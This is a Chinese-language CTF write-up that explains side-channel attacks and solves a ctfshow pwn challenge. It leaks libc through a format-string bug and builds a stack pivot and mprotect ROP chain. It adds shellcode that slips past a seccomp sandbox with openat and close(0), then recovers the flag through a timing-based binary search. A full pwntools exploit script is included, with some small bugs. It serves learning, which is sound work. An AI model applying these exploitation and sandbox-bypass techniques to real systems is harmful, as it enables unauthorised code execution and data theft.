0x00前言
======

最近总在一些群里听一些大佬在讨论侧信道攻击这种东西，终于在周末打ctfshow的卷王杯的时候终于见到了侧信道攻击的题目，并且复现了一下，对侧信道其中的姿势深感佩服。所以想要写下这篇文章分享一下侧信道攻击的技术。

0x01侧信道攻击是什么
============

侧信道攻击是一种非正常的攻击手段，是一种利用计算机不经意间发出的声音来判断计算机的执行情况，比如通过散热器的响声大小来判断计算机所运行程序的复杂性；通过窃听敲击键盘的声音来及进行破译你所输入的是什么；或者说是通过计算机组件再执行某些程序的时候需要消耗不同的电量，来监视你的计算机。

在一些影视剧中，我们可能会看到许多类似的情节，通过听保险箱密码锁转动的声音来判断每一位密码的正确性。不光是影视剧中，现实中的测信道攻击也是存在的。2017年昆明的小学生通过‘听声音’一分钟解锁共享单车的密码锁，也属于是一种侧信道攻击的手段。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-7867f5fae1a888417505f07fd15b02f3f7577f99.png)

所谓侧信道就是和主信道相对而言的，我们的信息通过主信道进行传输，但是在密码设备进行密码处理的时候就会通过侧信道泄露一定的功耗、电磁辐射、热量、声音等信息，泄露的信息随着周围环境的不同而有所差距，所以在不同的环境条件下同样信息的侧信道数据是不同的。攻击者就是通过分析信息之间的差异来得出设备的信息或者说是密文内容。

0x02PWN中的侧信道攻击
==============

pwn除非是在很极端的情况下才用得到侧信道攻击，在解题的过程中程序开启了沙箱禁用了execve函数，使我们不能够正常提权拿到shell去cat flag。通常这种情况就需要我们使用orw去输出flag，即利用open、read、write函数将flag从文件中读入到内存当中，然后利用write函数输出flag，事实上这种情况也是蛮理想的，可以直接拿到flag的明文。如果程序在攻击的过程中同时仅用了write，或者是close(1)关闭了输出流我们应该怎么去获得flag。甚至是仅用了read函数的某些使用，这就用到了侧信道攻击在pwn中的运用。

侧信道攻击在pwn中的主要思想就是通过逐位爆破获得flag的明文，判断的依据一般是判断猜测的字符和flag的每一位进行对比，如果相同就进入死循环，然后利用时间判断是否正确，循环超过一秒则表示当前爆破位爆破字符正确。通常侧信道攻击一般都是通过shellcode来实现的，并且比较的方法最好是使用‘二分法’这样的话节约时间并且效率高。

接下来就通过一道pwn题来理解一下侧信道攻击在ctf中的运用。

0x03题目
======

题目是ctfshow卷王杯的一道题目，比赛结束了还只有一解。

例行检查
----

开启了全部RELRO保护还有堆栈不可执行保护。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-1840955e1fb6c65261a47134ec77e74577c2373b.png)

动态分析
----

执行了之后出现了一个输入点

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-1c4f951e4609578c999215ad741aefb40d4a9e63.png)

测试格式化字符串漏洞：并发现第一个输入点是有格式化字符串漏洞的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e3fe2cc594cb9b8cccb5b64db85f53b1c82cbf01.png)

在此之后还有一个输入点：并且这个输入点不存在格式化字符串漏洞。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-c0982a5aa8249f42d0b9268a8ac6df3a9d08801c.png)

测试第二个输入点的栈溢出，似乎是存在栈溢出的，但是也不能直接确定，还是需要通过静态分析来获得结果。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-2fc9c98ff9cc4cd40b571aea0926284d5b5ccaab.png)

静态分析
----

main函数，和动调分析得到的结果是一样的

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5991c77353469226e44c34e849a3c071397523db.png)

格式化字符串漏洞利用
----------

我们似乎可以使用第一个输入点的格式化字符串漏洞来进行leak\_libc地址

调试发现栈内是有libc中的地址的，可以通过\_\_libc\_main\_main+243来leak libc地址。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a040616e0eb63d56226bb2a82d160681276979f0.png)

```c
s(b'%25$p')
ru(b"Hello, ")
libc_base = int(r(16)[2:], 16) - 0x7f6c4a5320b3 + 0x7f6c4a50b000
print(hex(libc_base))
```

栈迁移利用
-----

接下来就是栈溢出的漏洞了，只溢出了0x10长度的字符，也就是能够覆盖到rbp，ret的位置。也不难想到这种溢出较少的展出是在考察栈迁移，那么要把栈迁到哪里去那？首先，先要搞清楚栈迁移是为了什么？无非就是两种，第一执行栈以外地方的东西，第二就是向其他地方写入东西。程序中没有后门或者写好的shellcode，显然是第二种情况。我们看一下read函数的汇编。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e634366797dca25a78847eac0839b844e50187af.png)

可以看出read写入的地址是以rbp为索引的，所以我们如果能控制rbp的值就可以实现任意地址写，那我们利用就显得很方便了。首先，利用第二种栈迁移将栈迁移到bss段写入我们需要执行的东西，然后利用第一种栈溢出去执行我们写入的shellcode或者gadget去执行。

orw实现
-----

再来看一下sandbox，本来我是不知道这个也可以实现sandbox功能的，但是wp上写了有沙箱我找了好久才意识到这个函数的，此函数的具体用法参考：

[用prctl系统调用实现自定义过滤规则的seccomp - Homura`&#39;'`s Blog](http://homura.cc/blog/archives/145)

是个黑名单式的sandbox，禁用了socket，open，read啧啧啧啧，束手无策来着，没有办法orw了哇，close(1)关闭了输出流了。socket被禁用应该是为了防止重启输出流。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4ec1a3fdc92d64385126da6ead75668b39262110.png)

\#######################看了官方wp之后##########################

明白！虽然仅用了open的系统调用，还可以使用openat系统调用，引用官方wp的一句话

```c
libc中的open函数就是对openat这个底层系统调用的封装
```

orw中，o有了再来看看r怎么整。read相关系统调用并不是全部都禁用了，当read得fd为0的时候，read是可用的。对于常规的orw来说，open一个文件之后，由于012都用做标准输入输出，报错占用了，所以文件描述都是从3开始的，倘若我们再open之前close(0)之后，再进行open的话，那么文件描述符就是0了，这样的话就可以read了。

\#############################################################

这样的话我们就可以写入read的系统调用

```c
sc_read = f'''
        xor rax, rax                     #将rax，rdx中清零
        xor rdi, rdi
        push {bss_addr+0x100}            #将迁移的地址pop进rsi寄存器作为第二个
        pop rsi
        push 0x100                       #将0x100的数值pop进rdx中作为第三个参数
        pop rdx
        syscall                          #触发系统调用
        jmp rsi
    '''
```

（写shellcode一定要指定arch哇，不然就跟我似的整了半下午的shellcode，最后加了个arch给解决了。）

我们先看bss段的base是多少，由于没有开启pie，因此我们从ida上就可以得到bss的地址

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-2f39e602d8364f736c2c1dd4f8e78dd3bfe44f28.png)

得到了bss的基地址是0x404020，但是在我们调试的时候发现这一段似乎并没有可执行的权限

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f6c27a5e3925c7982b21a038d645721d68ee0161.png)

可读可写但是不可执行，这样的话我们需要先赋予bss段可执行的权限，这就想到了mprotect函数。栈迁移到bass段之后，要先写入的是mprotect函数赋权的行为。那首先将我们需要用到的gadget还有地址写上。

```python
bss_addr = elf.bss() + 0x500
read_addr = 0x4013DD
leave_addr = 0x401402
pop_rdi_ret = libc_base + 0x26bb2
pop_rsi_ret = libc_base + 0x2709c
pop_rdx_r12_ret = libc_base + 0x11c421

```

着手去整，一步一步来走不通了想办法解决哇。

先进行ebp的劫持，然后向bss段上面写东西。

```python
    pl = p64(pop_rdi_ret) + p64(bss_addr & 0xfffff000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect_addr)
    pl += p64(bss_addr + len(pl) + 8) + asm(shellcode_read)
    pl += pl.ljust(0x80, b'\x00') + p64(bss_addr - 8) + p64(leave_addr)
    sleep(0.1)
    s(pl)
```

经过了这个payload之后，通过迁移我们将mrotect写入了bss段，然后再经过一次迁移将orw的shellcode写入bss上并跳转执行，接下来的问题就是解决orw中的w的问题emmm，，

### 侧信道攻击（重要的来了

**我又打开了writeup**

对于write的话我们可以使用侧信道攻击的方式，就是要对flag的每一位进行爆破，与我们已经read读入到内存中的真实flag进行对比，比如，若是相等就触发死循环，那么我们就可以通过判断接受数据用了多长时间来判断爆破是否正确，就是对flag的每一位进行爆破，当超过1秒则说明我们测试当下位的猜测正确。由于侧信道最好是通过shellcode来实现，故再之前需要使用mprotect的gadget链改一下bss段的可执行权限，而一次性只能读入0x80的大小的数据，可能无法将orw的shellcode和mprotect的gadget一起读进bss段，因此，我们可以**先写一小段**`<b>shellcode</b>`**作为跳板**和`mprotect`的`gadget`一起读入到`bss`段，再通过这个跳板，将`orw`的`shellcode`读到`bss`段上并跳转执行。

pwn中侧信道攻击的主要思想是：爆破。由于程序中的沙盒禁用了输出流，致使我们不能够直接获得flag的明文，这就是主信道获取信息的方式已经不能够被实现，然后我们使用flag中可能有的所有字符当作字典，逐位进行爆破，通过cmp返回的不同信息来判断flag的明文。这就是侧信道攻击的思想。

```python
    shellcode_main = f'''
        /* close(0) */#关闭输入流
        push 3
        pop rax
        xor rdi, rdi
        syscall
        /* openat("/flag") */
        push 257
        pop rax
        /* ( absolute path ) */
        mov rsi, 0x67616c662f
        push rsi
        mov rsi, rsp
        /*
        ( relative path )
        push -100
        pop rdi
        push 0x67616c66
        push rsp
        pop rsi
        */
        syscall
        /* read flag */
        xor rax, rax
        xor rdi, rdi
        mov rsi, rsp
        push 0x50
        pop rdx
        syscall
        /* blow up flag */
        mov al, byte ptr[rsi+{pos}]
        cmp al, {char}
        ja $-2
        ret
    '''
    sleep(0.1)
    s(asm(shellcode_main))
```

其实这个shellcode可以当作模板来存下，之后再遇到此类题目的时候稍微改一改就可以用了

exp：
----

```python
#encoding = utf-8
import os
import sys
import time
from pwn import *
from LibcSearcher import * 

context.log_level = "debug"
context.os = 'linux'
context.arch = 'amd64'

binary = "checkin"
libcelf = "libc-2.30.so"
ip = ""
port = ""
local = 1
arm = 0
core = 64

og = [0x4342,0x3342]

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

if(local==1):
    if(arm==1):
        if(core==64):
            p = process(["qemu-arm", "-g", "1212", "-L", "/usr/arm-linux-gnueabi",binary])
        if(core==32):
            p = process(["qemu-aarch64", "-g", "1212", "-L", "/usr/aarch64-linux-gnu/", binary])
    else:
        p = process(binary)
else:
    p = remote(ip,port)

elf = ELF(binary)
libc = ELF(libcelf)

bss_addr = elf.bss() + 0x500
read_addr = 0x4013DD
leave_addr = 0x401402

possible_list = "-0123456789abcdefghijklmnopqrstuvwxyz{}"

def pwn(pos, char):
    sla(b"name :\n", b'%25$p')
    ru(b"Hello, ")
    libc_base = int(r(16)[2:], 16) - 0x7f6c4a5320b3 + 0x7f6c4a50b000
    pl = b'\x00'*0x80 + p64(bss_addr + 0x80) + p64(read_addr)
    sa(b"check in :\n", payload)

    shellcode_read = f'''
        xor rax, rax
        xor rdi, rdi
        push {bss_addr+0x100}
        pop rsi
        push 0x100
        pop rdx
        syscall
        jmp rsi
    '''
    pop_rdi_ret = libc_base + 0x26bb2
    pop_rsi_ret = libc_base + 0x2709c
    pop_rdx_r12_ret = libc_base + 0x11c421
    mprotect_addr = libc_base + libc.sym['mprotect']
    pl = p64(pop_rdi_ret) + p64(bss_addr & 0xfffff000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect_addr)
    pl += p64(bss_addr + len(pl) + 8) + asm(shellcode_read)
    pl = pl.ljust(0x80, b'\x00') + p64(bss_addr - 8) + p64(leave_addr)
    sleep(0.1)
    s(pl)

    shellcode_main = f'''
        /* close(0) */
        push 3
        pop rax
        xor rdi, rdi
        syscall
        /* openat("/flag") */
        push 257
        pop rax
        /* ( absolute path ) */
        mov rsi, 0x67616c662f
        push rsi
        mov rsi, rsp
        /*
        ( relative path )
        push -100
        pop rdi
        push 0x67616c66
        push rsp
        pop rsi
        */
        syscall
        /* read flag */
        xor rax, rax
        xor rdi, rdi
        mov rsi, rsp
        push 0x50
        pop rdx
        syscall
        /* blow up flag */
        mov al, byte ptr[rsi+{pos}]
        cmp al, {char}
        ja $-2
        ret
    '''
    sleep(0.1)
    s(asm(shellcode_main))

'''
i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:  
        pwn()
    except Exception:
        p.close()
        if(local == 1):
            p = process(binary)
        else:
            p = remote(ip,port)
        continue

if __name__ == '__main__':
    pwn()
'''

if __name__ == '__main__' :
    start = time.time()
    pos = 0
    flag = ""
    while True:
        left, right = 0, len(possible_list)-1
        while left < right :
            mid = (left + right) >> 1
            p = process(binary)
            pwn(pos, ord(possible_list[mid]))
            s = time.time()
            r(timeout = 1)
            t = time.time()
            p.close()
            if t - s > 1 :
                left = mid + 1
            else :
                right = mid
        flag += possible_list[left]
        info(flag)
        if possible_list[left] == '}' :
            break
        pos = pos + 1
    success(flag)
    end = time.time()
    success("time:\t" + str(end - start) + "s")
```